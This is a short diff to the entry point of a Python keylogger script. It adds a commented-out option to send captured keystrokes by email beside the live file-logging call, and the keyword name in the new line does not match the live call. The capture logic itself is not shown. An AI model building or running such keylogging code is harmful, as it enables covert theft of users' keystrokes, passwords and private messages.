@@ -97,5 +97,6 @@ class Keylogger:
 
 # call the function with the methods on script execution.
 if __name__ == '__main__':
+    # keylogger = Keylogger(interval=SAVE_FILE_EVERY, report_methods="email") // For Email
     keylogger = Keylogger(interval=SAVE_FILE_EVERY, report_method="file")
     keylogger.start()
